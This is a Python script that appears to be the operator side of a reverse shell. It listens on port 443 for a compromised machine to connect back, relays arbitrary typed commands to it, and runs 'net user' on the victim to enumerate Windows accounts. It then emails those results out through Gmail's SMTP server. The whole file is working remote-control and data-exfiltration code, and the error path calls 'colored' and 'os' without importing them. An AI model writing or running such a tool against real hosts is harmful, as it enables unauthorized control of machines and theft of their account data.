#!/usr/bin/env python3

import socket
import signal
import sys
import smtplib

from email.mime.text import MIMEText

def def_handler(sig, frame):
    print("\n[!] Quitting the program...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

class Listener:
    
    def __init__(self, ip, port):
        s = self.create_socket()
        s.bind((ip, port))
        s.listen()

        self.client_socket, client_addr = s.accept()

        print(f"\n[+] Connection established by {client_addr}\n")

    def create_socket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        return s
        
    def send_mail(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
           try:
               smtp_server.login(sender, password)
               smtp_server.sendmail(sender, recipients, msg.as_string())
           except smtplib.SMTPAuthenticationError:
               print(colored("\n[!] Incorrect credentials to send email.\n", "red"))
               os._exit(1) 

    def get_users(self):
        self.client_socket.send(b"net user")
        output = self.client_socket.recv(4096).decode()
    
        self.send_mail('Get Users', output, 'sender@gmail.com', ['sender@gmail.com'], 'password')

    def run(self):
        while True:
            command = input('>> ')

            if command == "get users":
                self.get_users()
            else:
                self.client_socket.send(command.encode())
                output = self.client_socket.recv(4096).decode()
                print(f"\n{output}\n")

if __name__ == "__main__":
    my_listener = Listener("192.168.100.55", 443)
    my_listener.run()
